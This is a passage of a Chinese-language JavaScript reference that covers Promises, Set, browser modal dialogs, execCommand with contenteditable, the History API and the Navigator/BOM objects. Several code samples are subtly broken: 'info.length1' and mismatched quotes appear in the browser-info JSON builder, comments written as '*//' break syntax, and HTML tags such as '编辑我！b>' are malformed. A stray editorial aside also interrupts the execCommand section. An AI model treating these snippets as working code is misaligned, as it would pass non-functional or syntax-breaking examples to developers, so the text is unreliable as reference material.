  \ // 每隔 1 秒记录 1, 3, 5, 'success at 5'\n```\n\n\n\n\n\n1. 我们对源数组调用 `.reduce()`，并提供\
  \ `Promise.reject()` 作为初始值。\n\n2. 每一个归约的元素都会为初始值添加一个 `.catch()`。\n\n3. `reduce()`\
  \ 的结果将是 `Promise.reject().catch(...).catch(...)`。\n\n4. 我们在 `reduce` 之后手动附加 `.then(successHandler,\
  \ errorHandler)`，以便在之前的任何步骤成功解析（resolve）时执行 `successHandler`。如果所有步骤都失败，则将执行 `errorHandler`。\n\
  \n注意：\"catch\" 归约是 `Promise.any()` 的顺序对应实现（已在 `bluebird.js` 中实现，但目前原生 ECMAScript\
  \ 尚未包含）。\n\n### 第 42.5 ：等待多个并发 Promise 中的第一个\n\n`Promise.race()` 静态方法接受一个 Promise\
  \ 的可迭代器，并在迭代器中的**第一个** Promise 解析或拒绝时立即返回一个新的相应解析或拒绝的句 Promise。\n\n```javascript\n\
  *// 等待 \"milliseconds\" 毫秒，然后用 \"value\" 解析*\nfunction resolve(value, milliseconds)\
  \ {\n  return new Promise(resolve => setTimeout(() => resolve(value), milliseconds));\n\
  }\n\n*// 等待 \"milliseconds\" 毫秒，然后用 \"reason\" 拒绝*\nfunction reject(reason, milliseconds)\
  \ {\n  return new Promise((_, reject) => setTimeout(() => reject(reason), milliseconds));\n\
  }\n\nPromise.race([\n  resolve(1, 5000),\n  resolve(2, 3000),\n  resolve(3, 1000)\n\
  ])\n.then(value => console.log(value)); // 1 秒后输出 \"3\"\n\nPromise.race([\n  reject(new\
  \ Error('bad things!'), 1000),\n  resolve(2, 2000)\n])\n.then(value => console.log(value))\
  \ // 什么都不输出\n.catch(error => console.log(error.message)); // 1 秒后输出 \"bad things!\"\
  \n```\n\n### 第 42.6 节 将回调函数“Promise 化”\n\n给定一个接受 Node 风格回调的函数：\n\n```javascript\n\
  fooFn(options, function callback(err, result) { ... });\n```\n\n你可以这样对其进行 Promise\
  \ 化 *(将其转换为基于 Promise 的函数)*：\n\n```javascript\nfunction promiseFooFn(options) {\n\
  \  return new Promise((resolve, reject) =>\n    fooFn(options, (err, result) =>\n\
  \      // 如果有错误，则拒绝；否则解析\n      err ? reject(err) : resolve(result)\n    )\n  );\n\
  }\n```\n\n该函数可以如下所示使用：\n\n```javascript\npromiseFooFn(options).then(result => {\
  \ \n  // 成功了！\n}).catch(err => {\n  // 错误！\n});\n```\n\n更通用的方法是，如何对任何给定的回调风格函数进行\
  \ Promise 化：\n\n```javascript\nfunction promisify(func) {\n  return function(...args)\
  \ {\n    return new Promise((resolve, reject) => {\n      func(...args, (err, result)\
  \ => err ? reject(err) : resolve(result));\n    });\n  }\n}\n```\n\n可以这样使用：\n\n\
  ```javascript\nconst fs = require('fs');\nconst promisedStat = promisify(fs.stat.bind(fs));\n\
  \npromisedStat('/foo/bar')\n  .then(stat => console.log('STATE', stat))\n  .catch(err\
  \ => console.log('ERROR', err));\n```\n\n### 第 42.7 节 错误处理\n\n从 Promise 抛出的错误由传递给\
  \ `then` 的第二个参数（`reject`）或传递给 `catch` 的处理器处理：\n\n```javascript\nthrowErrorAsync()\n\
  \  .then(null, error => { /* 在此处处理错误 */ }); // 或\nthrowErrorAsync()\n  .catch(error\
  \ => { /* 在此处处理错误 */ });\n```\n\n#### 链式\n\n如果你有一个 Promise 链，错误将导致跳过解析处理器（resolve\
  \ handlers）：\n\n```javascript\nthrowErrorAsync()\n  .then(() => { /* 永远不会调用 */ })\n\
  \  .catch(error => { /* 在此处处理错误 */ });\n```\n\n同样适用于你的 `then` 函数。如果解析处理器抛出异常，则将调用下一个拒绝处理器（reject\
  \ handler）：\n\n```javascript\ndoSomethingAsync()\n  .then(result => { throwErrorSync();\
  \ })\n  .then(() => { /* 永远不会调用 */ })\n  .catch(error => { /* 处理来自 throwErrorSync()\
  \ 的错误 */ });\n```\n\n错误处理器返回一个新的 Promise，允许你继续执行 Promise 链。错误处理器返回的 Promise 将用处理器返回的值进行解析：\n\
  \n```javascript\nthrowErrorAsync()\n  .catch(error => { /* 在此处处理错误 */; return result;\
  \ })\n  .then(result => { /* 在此处处理结果 *// });\n```\n\n你可以通过重新抛出错误让错误在 Promise 链中向下级联：\n\
  \n```javascript\nthrowErrorAsync()\n  .catch(error => {\n    /* 处理来自 throwErrorAsync()\
  \ 的错误 */\n    throw error;\n  })\n  .then(() => { /* 如果有错误则不会被调用 *// })\n  .catch(error\
  \ => { /* 将会被相同的错误调用 */ });\n```\n\n通过将 `throw` 语句封装在 `setTimeout` 回调内部，可以抛出一个不被\
  \ Promise 处理的异常：\n\n```javascript\nnew Promise((resolve, reject) => {\n  setTimeout(()\
  \ => { throw new Error(); });\n});\n```\n\n这之所以起作用，是因为 Promise 无法处理异步抛抛出的异常。\n\n\
  #### 未处理的拒绝\n\n如果 Promise 没有 `catch` 块或拒绝处理器，错误将无声忽略：\n\n```javascript\nthrowErrorAsync()\n\
  \  .then(() => { /* ... *// });\n```\n\n为了防止这种情况，请始终使用 `catch` 块：\n\n```javascript\n\
  throwErrorAsync()\n  .then(() => { /* ... *// })\n  .catch(error => { /* ... */\
  \ });\n```\n\n\n\n\n\n```javascript\n.then(() => { throw new Error(); }) // 在成功处理程序中的错误\
  \ .catch(error => { /* 处理错误 */ });\n```\n\n在交替使用 `then(fulfill, reject)` 与 `catch(reject).then(fulfill)`\
  \ 时，存在类似的问题，只不过它传递的是已完成（fulfilled）的 promise 而不是被拒绝（rejected）。\n\n### 在应该返回 promise\
  \ 的函数中同步抛出错误\n\n假设这样一个函数：\n\n```javascript\nfunction foo(arg) {\n  if (arg === 'unexepectedValue')\
  \ { throw new Error('UnexpectedValue') }\n  return new Promise(resolve =>\n    setTimeout(()\
  \ => resolve(arg), 1000)\n  )\n}\n```\n\n如果在 promise 链中间使用这样的函数，那么显然没有问题：\n\n```javascript\n\
  makeSomethingAsync ()\n  .then(() => foo('unexpectedValue'))\n  .catch(err => console.log(err))\
  \ // <-- 错误：UnexpectedValue 将在此处捕获\n```\n\n然而，如果从 promise 链之外调用同一个函数，该错误将不会被它处理，并会抛给应用程序：\n\
  \n```javascript\nfoo ('unexpectedValue') // <-- 错误将被抛出，导致应用程序崩溃\n  .then(makeSomethingAsync)\
  \ // <-- 不执行\n  .catch(err => console.log(err)) // <-- 不会被捕获\n```\n\n有 2 种可能的解决方法：\n\
  \n#### 返回一个带有错误的被拒绝 promise\n\n与其抛出（throw），不如如下操作：\n\n```javascript\nfunction foo(arg)\
  \ {\n  if (arg === 'unexepectedValue') {\n    return Promise.reject(new Error('UnexpectedValue'))\
  \ \n  }\n  return new Promise(resolve =>\n    setTimeout(() => resolve(arg), 1000)\n\
  \  )\n}\n```\n\n#### 将你的函数封装进 promise 链\n\n当你的 `throw` 语句已经在 promise 链内部时，它会被正确地捕获：\n\
  \n```javascript\nfunction foo(arg) {\n  return Promise.resolve()\n    .then(() =>\
  \ {\n      if (arg === 'unexepectedValue') { throw new Error('UnexpectedValue')\
  \ }\n      return new Promise(resolve =>\n        setTimeout(() => resolve(arg),\
  \ 1000)\n      )\n    })\n}\n```\n\n### 42.8 节：协调同步和异步操作\n\n在某些情况下，你可能希望将同步操作封装在\
  \ promise 中，以防止代码分支中的重复。参考这个示例：\n\n```javascript\nif (result) { // 如果我们已经有了结果\n\
  \  processResult(result); // 处理它\n} else {\n  fetchResult().then(processResult);\n\
  }\n```\n\n通过冗余地将同步操作封装在 promise 中，可以协调上述代码的同步和异步分支：\n\n```javascript\nvar fetch\
  \ = result\n  ? Promise.resolve(result) : fetchResult();\nfetch.then(processResult);\n\
  ```\n\n在缓存异步调用的结果时，缓存 promise 比缓存结果本身更好。这确保了只需要一个异步操作就可以解析多个并行请求。\n\n当遇到错误条件时，应注意使缓存失效。\n\
  \n```javascript\n// 一个预计不会频繁更改的资源\nvar planets = 'http://swapi.co/api/planets/';\
  \ // 缓存的 promise，或 null\nvar cachedPromise;\n\nfunction fetchResult() {\n  if (!cachedPromise)\
  \ {\n    cachedPromise = fetch(planets)\n      .catch(function (e) {\n        //\
  \ 使当前结果失效以便在下次 fetch 时重试\n        cachedPromise = null;\n        // 重新抛出错误以便传递给调用者\n\
  \        throw e;\n      });\n  }\n  return cachedPromise;\n}\n```\n\n### 42.9 节：延迟函数调用\n\
  \n`setTimeout()` 方法在指定的毫秒数后调用函数或评估表达式。它也是实现异步操作的一种简单方法。\n\n在这个示例中，调用 wait 函数会在作为第一个参数指定的时间后解析\
  \ promise：\n\n```javascript\nfunction wait(ms) {\n  return new Promise(resolve =>\
  \ setTimeout(resolve, ms));\n}\n\nwait (5000).then(() => {\n  console.log('5 秒已过...');\n\
  });\n```\n\n### 42.10 节：值的“Promise 化”\n\n`Promise.resolve` 静态方法可以将值封装进 promise 中。\n\
  \n```javascript\nlet resolved = Promise.resolve(value);\n```\n\n如果 `value` 已经是 promise，`Promise.resolve`\
  \ 只是会返回它。\n\n```javascript\nlet one = Promise.resolve(value);\n```\n\n如果 `value`\
  \ 是一个 thenable 对象，`Promise.resolve` 能够处理它。\n\n```javascript\nlet resolved = Promise.resolve(value);\n\
  ```\n\n`Promise.reject` 静态方法返回一个被拒绝的 promise。\n\n```javascript\nlet rejected = Promise.reject(reason);\n\
  ```\n\n### 42.11 节：使用 async/await\n\n上述示例可以使用 `async/await` 并使用 `try/catch` 编写。\n\
  \n```javascript\nfunction loadImage(url) {\n  return new Promise((resolve, reject)\
  \ => {\n    const img = new Image();\n    img.onload = () => resolve(img);\n   \
  \ img.onerror = () => reject(new Error(`Failed to load ${url}`));\n    img.src =\
  \ url;\n  });\n}\n\n(async () => {\n  try {\n    let img = await loadImage('http://example.com/image.png');\n\
  \    document.getElementById('image-holder').appendChild(img);\n  } catch (error)\
  \ {\n    console.error(error);\n  }\n})();\n```\n\n### 42.12 节：通过 finally() 执行清理\n\
  \n目前有一个提议（尚未成为 ECMAScript 标准）为 promise 添加一个 `finally` 回调，无论 promise 是完成还是被拒绝都会执行。在语义上，这类似于\
  \ `try` 块的 `finally` 子句。\n\n你通常会使用此功能进行清理：\n\n```javascript\nvar loadingData = true;\n\
  fetch ('data')\n  .then(result => processData(result.data))\n  .catch(error => console.error(error))\n\
  \  .finally(() => {\n    loadingData = false;\n  });\n```\n\n\n\n\n\n如果你需要逐个高效处理成千上万个项目，这非常有帮助。使用普通的\
  \ `for` 循环创建 promises 会一次性创建它们，并占用大量的 RAM。\n\n## 章节 42.14: 异步 API 请求\n\n这是一个简单的\
  \ GET API 调用示例，封装在 promise 中，以利用其异步功能。\n\n```javascript\nvar get = function(path)\
  \ {\n  return new Promise(function(resolve, reject) {\n    let request = new XMLHttpRequest();\n\
  \    request.open('GET', path);\n    request.onload = resolve;\n    request.onerror\
  \ = reject;\n    request.send();\n  });\n};\n```\n\n可以使用以下 `onload` 和 `onerror`\
  \ 函数进行更健壮的错误处理。\n\n```javascript\nrequest.onload = function() {\n  if (this.status\
  \ >= 200 && this.status < 300) {\n    if (request.response) {\n      // 假设成功调用返回\
  \ JSON\n      resolve(JSON.parse(request.response));\n    } else {\n      resolve();\n\
  \    }\n  } else {\n    reject({\n      'status': this.status,\n      'message':\
  \ request.statusText\n    });\n  }\n};\n\nrequest.onerror = function() {\n  reject({\n\
  \    'status': this.status,\n    'message': request.statusText\n  });\n};\n```\n\
  \n## 章节 43: Set\n\n### 参数\n-可迭代值 回调函数 thisArg\n\n### 详情\n\n如果传递一个可迭代对象，其所有元素都将被添加到新的\
  \ `Set` 中。`null` 被处理为 `undefined`。\n\n要添加到 `Set` 对象的元素值。\n\n为每个元素执行的函数。\n\n可选。当执行\
  \ `callback` 时，用作 `this` 的值。\n\n`Set` 对象允许你存储任何类型的唯一值，无论是原始值还是对象引用。\n\n`Set` 对象是值的集合。你可以按照插入顺序遍历集合中的元素。`Set`\
  \ 中的一个值只能出现 `ONCE`（一次）；它在 `Set` 集合中是唯一的。不同的值是使用 `SameValueZero` 比较算法进行区分的。\n\n关于\
  \ Set 的标准规范\n\n### 章节 43.1: 创建 Set\n\n`Set` 对象允许你存储任何类型的唯一值，无论是原始值还是对象引用。\n\n你可以将项目推入集合并像普通\
  \ JavaScript 数组一样遍历它们，但与数组不同，如果该值已存在于 `Set` 中，你无法向其添加该值。\n\n创建一个新集合：\n\n```javascript\n\
  const mySet = new Set();\n```\n\n或者你可以从任何可迭代对象创建一个集合以给它提供初始值：\n\n```javascript\n\
  const arr = [1,2,3,4,4,5];\nconst mySet = new Set(arr);\n```\n\n在上面的示例中，集合的内容将是\
  \ `{1, 2, 3, 4, 5}`。注意值 `4` 只出现一次，与用于创建它的原始数组不同。\n\n### 章节 43.2: 向 Set 添加值\n\n要向\
  \ `Set` 添加一个值，请使用 `.add()` 方法：\n\n```javascript\nmySet.add(5);\n```\n\n如果该值已存在于集合中，它将不再被添加，因为\
  \ `Sets` 包含唯一值。\n\n注意 `.add()` 方法返回集合本身，因此你可以链式调用 `add`：\n\n```javascript\nmySet.add(1).add(2).add(3);\n\
  ```\n\n### 章节 43.3: 从集合中删除值\n\n要从集合中删除一个值，请使用 `.delete()` 方法：\n\n```javascript\n\
  mySet.delete(some_val);\n```\n\n如果值存在于集合中已被删除，此函数将返回 `true`，否则返回 `false`。\n\n###\
  \ 章节 43.4: 检查值是否存在于集合中\n\n要检查给定值是否存在于集合中，请使用 `.has()` 方法：\n\n```javascript\nmySet.has(someVal);\n\
  ```\n\n如果 `someVal` 现在集合中，将返回 `true`，否则返回 `false`。\n\n### 章节 43.5: 清空 Set\n\n你可以使用\
  \ `.clear()` 方法移除集合中的所有元素：\n\n```javascript\nmySet.clear();\n```\n\n### 章节 43.6:\
  \ 获取集合长度\n\n你可以使用 `.size` 属性获取集合内部元素的数量：\n\n```javascript\nconst mySet = new Set([1,\
  \ 2, 2, 3]);\nmySet.add(4);\nmySet.size; // 4\n```\n\n该属性与 `Array.prototype.length`\
  \ 不同，它是只读的，这意味着你不能通过给它赋值来更改：\n\n```javascript\nmySet.size = 5;\nmySet.size; // 4\n\
  ```\n\n在严格模式下，它甚至会抛错误：\n\n```text\nTypeError: Cannot set property size of #<Set>\
  \ which has only a getter\n```\n\n### 章节 43.7: 将 Set 转换为数组\n\n有时你可能将 `Set` 转换为数组，例如为了能够使用\
  \ `Array.prototype` 方法如 `.filter()`。为了实现这一点，请使用 `Array.from()` 或解构赋值：\n\n```javascript\n\
  var mySet = new Set([1, 2, 3, 4]);\n// 使用 Array.from\nconst myArray = Array.from(mySet);\n\
  // 使用解构赋值\nconst myArray = [...mySet];\n```\n\n现在你可以过滤数组使其仅包含偶数，并使用 `Set` 构造函数将其转换回\
  \ `Set`：\n\n```javascript\nmySet = new Set(myArray.filter(x => x % 2 === 0));\n\
  ```\n\n`mySet` 现在只包含偶数。\n\n### 章节 43.8: 交集与差集\n\n`Sets` 中没有交集和差集的内置方法，但你仍然可以通过将其转换为数组、过滤后再转换回\
  \ `Set` 来实现它们：\n\n```javascript\nvar set1 = new Set([1, 2, 3, 4]);\nvar set2 = new\
  \ Set([3, 4, 5, 6]);\n// 交集\nconst intersection = new Set([...set1].filter(x =>\
  \ set2.has(x)));\n// 差集\nconst difference = new Set([...set1].filter(x => !set2.has(x)));\n\
  ```\n\n### 章节 43.9: 遍历 Set\n\n你可以使用简单的 `for-of` 循环遍历集合：\n\n```javascript\nconst\
  \ mySet = new Set([1, 2, 3]);\nfor (const value of mySet) {\n  console.log(value);\n\
  }\n```\n\n## 章节 44: 模态框 - 提示 (Prompts)\n\n### 章节 44.1: 关于提示\n\n用户提示是 Web Application\
  \ API 的方法，用于调用浏览器模态框以请求用户执行操作（如确认或输入）。\n\n`window.alert(message)`\n\n显示一个带有用户消息的模态弹出框。需要用户点击\
  \ `[OK]` 来关闭。\n\n```javascript\nalert(\"Hello World\");\n```\n\n`boolean = window.confirm(message)`\n\
  \n显示带有提供消息的模态弹出框。提供 `[OK]` 和 `[Cancel]` 按钮，分别响应布尔值 `true` / `false`。\n\n```javascript\n\
  confirm(\"Delete this comment?\");\n```\n\n`result = window.prompt(message, defaultValue)`\n\
  \n显示一个带有提供的消息和一个带有可选预填充值的输入框的模态弹出框。作为 `result` 返回用户提供的输入值。\n\n```javascript\nprompt(\"\
  Enter your website address\", \"http://\");\n```\n\n更多信息请见下文“prompt() 的用法”。\n\n\
  ### 章节 44.2: 持久提示模态框\n\n使用 `prompt` 时，用户始终可以点击 *Cancel* 且不会返回任何值。为了防止空值并使其更具持久性：\n\
  \n```html\n<h2>欢迎 <span id=\"name\"></span>!</h2>\n```\n\n<script>\n// 持久提示模态\n\
  var userName;\nwhile(!userName) {\n  userName = prompt(\"Enter your name\", \"\"\
  );\n  if(!userName) {\n    alert(\"请，我们需要你的名字！\");\n  } else {\n    document. getElementById(\"\
  name\").innerHTML = userName;\n  }\n}\n</script>\n\n### 章节 44.3: 删除元素\n\n使用 `confirm()`\
  \ 的方法适用于当 UI 操作对页面进行某些*破坏性*更改时，且最好伴有**通知**和**用户确认**——例如在删除帖子消息之前：\n\n```html\n<div\
  \ id=\"post-102\"></div>\n```\n\n\n\n\n\n我喜欢确认模态框。\n\n<a data-deletepost=\"post-102\"\
  >删除帖子</a>\n\n<div id=\"post-103\">\n<p>那太酷了！</p>\n<a data-deletepost=\"post-103\"\
  >删除帖子</a>\n</div>\n\n```javascript\n// Collect all buttons\nvar deleteBtn = document.querySelectorAll(\"\
  [data-deletepost]\");\n\nfunction deleteParentPost(event) {\n  event.preventDefault();\
  \ // 防止点击锚点时页面滚动\n  if (confirm(\"确定要删除此帖子吗？\")) {\n    var post = document.getElementById(this.dataset.deletepost);\n\
  \    post.parentNode.removeChild(post);\n    // TODO: 从数据库中移除该帖子\n  } // else, 什么都不做\n\
  }\n\n// 为按钮绑定点击事件\n[].forEach.call(deleteBtn, function(btn) {\n  btn.addEventListener(\"\
  click\", deleteParentPost, false);\n});\n```\n\njsFiddle Demo\n\n### 第 44.4 ：alert()\
  \ 的用法\n\n`window` 对象的 `alert()` 方法会显示一个带有指定消息以及“确定”或“取消”按钮的警告框。该按钮的文本取决于浏览器，且无法修改。\n\
  \n#### 语法\n\n```javascript\nalert (\"Hello world!\");\n```\n\n```javascript\n//\
  \ 或者，另一种方法...\nwindow.alert(\"Hello world!\");\n```\n\n#### 输出\n\n![](img/image00704.jpeg)如果你想确保信息传达给用户，通常使用警告框。\n\
  \n**注意：** 警告框会夺取当前窗口的焦点，强制浏览器读取消息。不要过度使用此方法，因为它会在用户关闭框之前阻止访问页面的其他部分。它还会停止后续代码执行，直到用户点击确定（特别是使用\
  \ `setInterval()` 或 `setTimeout()` 设置的定时器也不会运行）。警告框仅在浏览器中有效，且其设计无法修改。\n\n#### 参数描述\n\
  \n`message`: 必选。指定在警告框中显示的文本，或转换为字符串并显示的对象。\n\n#### 返回值\n\n`alert` 函数不返回任何值\n\n\
  ### 第 44.5 ：prompt() 的用法\n\n`prompt` 将向用户显示一个对话框以请求输入。你可以提供一条放置在文本框上方的消息。返回值是一个表示用户提供输入的字符串。\n\
  \n```javascript\nvar name = prompt(\"你的名字是什么？\");\nconsole.log(\"Hello, \" + name);\n\
  ```\n\n你也可以给 `prompt()` 传递第二个参数，该参数将显示为提示文本框中的默认文本。\n\n```javascript\nvar name =\
  \ prompt('你的名字是什么？', ' 名字...');\nconsole.log('Hello, ' + name);\n```\n\n#### 参数描述\n\
  \n`message`: 必选。显示在提示文本框上方的文本。\n`default`: 可选。显示提示时在文本框中显示的默认文本。\n\n### 第 45 章：execCommand\
  \ 和 contenteditable\n\n#### commandId\n\n⋮ **行内格式命令**\n`backColor`, `bold`, `createLink`,\
  \ `fontName`, `fontSize`, `foreColor`, `strikeThrough`, `superscript`, `unlink`\n\
  \n⋮ **块级格式命令**\n`delete`, `formatBlock`, `forwardDelete`, `insertHorizontalRule`,\
  \ `insertHTML`, `insertImage`, `insertLineBreak`, `insertOrderedList`, `insertParagraph`,\
  \ `insertText`, `insertUnorderedList`, `justifyCenter`, `justifyFull`, `justifyLeft`,\
  \ `justifyRight`, `outdent`\n\n⋮ **剪贴板命令**\n`copy`, `cut`, `paste`\n\n⋮ **杂命令**\n\
  `defaultParagraphSeparator`, `redo`, `selectAll`, `styleWithCSS`, `undo`, `useCSS`\n\
  \n#### value\n\n- 颜色值：String\n- URL：String\n- 字体族名称：\"1\", \"2\", \"3\", \"4\",\
  \ \"5\", \"6\", \"7\"`\n- 颜色值：String (`\"address\", \"dd\", \"div\", \"dt\", \"\
  h1\", \"h2\", \"h3\", \"h4\", \"h5\", \"h6\", \"p\", \"pre\"`)\n- HTML：String\n\
  - URL：String\n- 文本字符串：当前选中字符串\n- 字符串：当前选中的字符串\n\n### 第 45.1 ：监听 contenteditable\
  \ 的变化\n\n适用于大多数表单元素的事件（例如 `change`, `keydown`, `keyup`, `keypress`）不适用于 `contenteditable`。\n\
  \n相反，你可以通过 `input` 事件监听 `contenteditable` 内容的变化。假设 `contenteditableHtmlElement`\
  \ 是一个具有 `contenteditable` 属性的 JS DOM 对象：\n\n```javascript\ncontenteditableHtmlElement.addEventListener(\"\
  input\", function() {\n  console.log(\"contenteditable element changed\");\n});\n\
  ```\n\n### 第 45.2 ：入门\n\nHTML 属性 `contenteditable` 提供了一种简单的方法，可以将 HTML 元素转换为用户可编辑的区域。\n\
  \n```html\n<div contenteditable>你可以 <b>编辑我！b></div>\n```\n\n#### 原生富文本编辑\n\n使用 JavaScript\
  \ 和 `execCommand`，你可以为当前焦点的 `contenteditable` 元素传递更多的编辑功能（特别是在光标位置或选择区域）。\n\n`execCommand`\
  \ 方法接受 3 个参数：\n\n```javascript\ndocument.execCommand(commandId, showUI, value)\n\
  ```\n\n- `commandId`: 字符串。来自可用的 `commandId` 列表（参见：参数→`commandId`）\n- `showUI`: 布尔（未实现。使用\
  \ `false`）\n- `value`: 字符串。如果命令期望一个命令相关的字符串 `value`，否则为空字符串 \"\"。（参见：参数→`value`）\n\
  \n使用 \"bold\" 命令和 \"formatBlock\"（需要值）的示例：\n\n```javascript\ndocument.execCommand(\"\
  bold\", false, \"\"); // 使选中文字加粗\n```\n\n<button data-edit=\"bold\"><b>B</b></button>\n\
  <button data-edit=\"italic\"><i>I</i></button>\n<button data-edit=\"formatBlock:p\"\
  >P</p></button>\n<button data-edit=\"formatBlock:H1\"><h1>H1</h1></button>\n<button\
  \ data-edit=\"insertUnorderedList\">UL</button>\n<button data-edit=\"justifyLeft\"\
  >&8676;</button>\n<button data-edit=\"justifyRight\">&8677;</button>\n<button data-edit=\"\
  removeFormat\">&times;</button>\n\n等等，示例中包含 data-edit 和 contenteditable。让我们重新对齐逻辑：\n\
  \n```html\n<div contenteditable><p>编辑我！p></div>\n```\n\n```javascript\n[].forEach.call(document.querySelectorAll(\"\
  [data-edit]\"), function(btn) {\n  btn.addEventListener(\"click\", edit, false);\n\
  });\n\nfunction edit(event) {\n  event.preventDefault();\n  var cmd_val = this.dataset.edit.split(\"\
  :\");\n  document.execCommand(cmd_val[0], false, cmd_val[1]);\n}\n```\n\njsFiddle\
  \ Demo\n\n基础富文本示例（现代浏览器）\n\n#### 结语\n\n即使已经存在了很久（IE6），`execCommand` 的实现和行为在浏览器之间也不同，这使得“构建一个功能全且跨浏览器兼容的\
  \ WYSIG 编辑”对于任何经验丰富的开发者来说都是一项艰巨的任务。\n\n即使没有完全标准化，你也可以在 **Chrome、Firefox、Edge** 等较新的浏览器上获得不错的结果。如果你需要对其他浏览器提供更好的支持以及更多\
  \ HTML 编辑等功能，经验法则是寻找已经存在且健壮的**富文本**编辑器。\n\n### 第 45.3 ：使用 execCommand(\"copy\")\
  \ 从 textarea 复制到剪贴板\n\n示例：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\
  \  <meta charset=\"UTF-8\">\n<title></title>\n</head>\n<body>\n  <textarea id=\"\
  content\"></textarea>\n  <input type=\"button\" id=\"copyID\" value=\"Copy\" />\n\
  \  <script type=\"text/javascript\">\n    var button = document.getElementById(\"\
  copyID\"), input = document.getElementById(\"content\");\n    button.addEventListener(\"\
  click\", function(event) {\n      event.preventDefault();\n      input.select();\n\
  \      document.execCommand(\"copy\");\n    });\n  </script>\n</body>\n</html>\n\
  ```\n\n`execCommand(\"copy\")` 将当前选择的内容复制到剪贴板\n\n### 第 45.4 ：格式化\n\n用户可以使用浏览器的功能为\
  \ contenteditable 文档或元素添加格式，例如常用的格式快捷键（Ctrl-B **加粗**，Ctrl-I *斜体* 等）或通过从剪贴板拖放图像、链接或标记。\n\
  \n此外，开发者可以使用 JavaScript 对当前选择（高亮文字）应用格式。\n\n```javascript\ndocument.execCommand('bold',\
  \ false, null); // 切换加粗格式\ndocument.execCommand('italic', false, null); // 切换斜体格式\n\
  document.execCommand('underline', false, null); // 切换下划线\n```\n\n### 第 46 章：历史\n\
  \n**参数详情**\n\n`domain`: 你想要更新的域名\n\n\n\n\n\ntitle 要更新的标题\n\npath 要更新的路径\n\n### 章节\
  \ 46.1: history.pushState()\n\n语法：\n\n`history.pushState(state object, title, url)`\n\
  \n此方法允许添加历史记录目。如需更多参考，请参阅此文档：`pushState()` 方法\n\n示例：\n\n```javascript\nwindow.history.pushState(\"\
  http://example.ca\", \"Sample Title\", \"/example/path.html\");\n```\n\n此示例在历史记录、地址栏和页面标题中插入了一条条新记录。\n\
  \n注意，这与 `history.replaceState()` 不同。后者更新当前的历史记录，而不是添加新的记录。\n\n### 章节 46.2: history.replaceState()\n\
  \n语法：\n\n`history.replaceState(data, title [, url ])`\n\n此方法修改当前的历史记录，而不是创建一个新的。主要用于我们想要更新当前历史记录的\
  \ URL 时。\n\n```javascript\nwindow.history.replaceState(\"http://example.ca\", \"\
  Sample Title\", \"/example/path.html\");\n```\n\n此示例替换了当前的历史记录、地址栏和页面标题。\n\n注意，这与\
  \ `history.pushState()` 不同。后者插入一条新的历史记录，而不是替换当前的。\n\n### 章节 46.3: 从历史记录列表中加载特定 URL\n\
  \ngo() 方法\n\n`go()` 方法从历史记录列表中加载特定的 URL。参数可以是数字，跳转到特定位置的 URL（-1 向后退一页，1 向前一页），也可以是字符串。字符串必须是部分或完整的\
  \ URL，该函数将跳转到第一个匹配该字符串的 URL。\n\n语法\n\n`history.go(number|URL)`\n\n示例\n\n点击按钮返回两页：\n\
  \n```html\n<html\n<head>\n<script type=\"text/javascript\">\nfunction goBack()\n\
  {\n  window.history.go(-2)\n}\n</script>\n</head>\n<body>\n<input type=\"button\"\
  \ value=\"Go back 2 pages\" onclick=\"goBack()\" />\n</body>\n</html>\n```\n\n###\
  \ 章节 47: Navigator 对象（导航器对象）\n\n#### 章节 47.1: 获取一些基本浏览器数据并将其作为 JSON 对象返回\n\n以下函数可以用于获取有关当前浏览器的基本信息，并以\
  \ JSON 格式返回。\n\n```javascript\nfunction getBrowserInfo() {\n  var json = \"[{\"\
  ,\n  /* 包含浏览器信息的数组 */\n  info = [\n    navigator.userAgent, // 获取 User-agent\n \
  \   navigator.cookieEnabled, // 检查浏览器是否启用了 cookies\n    navigator.appName, // 获取浏览器名称\n\
  \    navigator.language, // 获取浏览器语言\n    navigator.appVersion, // 获取浏览器版本\n    navigator.platform\
  \ // 获取浏览器编译的平台 \n  ],\n  /* 包含浏览器信息名称的数组 */ \n  infoNames = [\n    \"userAgent\"\
  ,\n    \"cookiesEnabled\",\n    \"browserName\",\n    \"browserLang\",\n    \"browserVersion\"\
  ,\n    \"browserPlatform\"\n  ];\n  /* 创建 JSON 对象 */\n  for (var i = 0; i < info.length;\
  \ i++) {\n    if (i === info.length1) {\n      json += '\"' + infoNames[i] + '\"\
  : \"' + info[i] + '\"'; \n    } else {\n      json += '\"' + infoNames[i] + '\"\
  : '\" + info[i] + '\",'; \n    }\n  };\n  return json + \"}]\";\n};\n```\n\n###\
  \ 章节 48: BOM (浏览器对象模型)\n\n#### 章节 48.1: 简介\n\nBOM（浏览器对象模型）包含了代表当前浏览器窗口和组件的对象；用于模拟历史、设备屏幕等内容的对象。\n\
  \nBOM 中的顶层对象是 `window` 对象，它代表当前的浏览器窗口或标签页。\n\n![](img/image00705.jpeg)\n\n- **Document**:\
  \ 代表当前的网页。\n- **History**: 代表浏览器历史记录中的页面。\n- **Location**: 代表当前页面的 URL。\n- **Navigator**:\
  \ 代表有关浏览器的信息。\n- **Screen**: 代表设备的显示器信息。\n\n### 章节 48.2: Window 对象属性\n\n`Window`\
  \ 对象包含以下属性。\n\n| 属性 | 描述 |\n| :--- | :--- |\n| `window.closed` | 窗口是否已关闭 |\n| `window.length`\
  \ | 窗口 `<<iframe>` 元素的数量 |\n| `window.name` | 获取或设置窗口名称 |\n| `window.innerHeight`\
  \ | 窗口的高度 |\n| `window.innerWidth` | 窗口的宽度 |\n| `window.screenX` | 指针相对于屏幕左上角的 X\
  \ 坐标 |\n| `window.screenY` | 指针相对于屏幕左上角的 Y 坐标 |\n| `window.location` | 窗口对象的当前 URL（或本地文件路径）\
  \ |\n| `window.history` | 指向浏览器窗口或标签页历史对象的引用。 |\n| `window.screen` | 指向屏幕对象的引用 |\n\
  | `window.pageXOffset` | 文档水平滚动的距离 |\n| `window.pageYOffset` | 文档垂直滚动的距离 |\n\n###\
  \ 章节 48.3: Window 对象方法\n\n浏览器对象模型中最重要的对象是 `window` 对象。它有助于访问有关浏览器及其组件的信息。为了访问这些功能，它有许多各种方法和属性。\n\
  \n| 方法 | 描述 |\n| :--- | :--- |\n| `window.alert()` | 创建一个带有消息和 OK 按钮的对话框 |\n| `window.blur()`\
  \ | 从窗口移除焦点 |\n| `window.close()` | 关闭浏览器窗口 |\n| `window.confirm()` | 创建一个带有消息、OK\
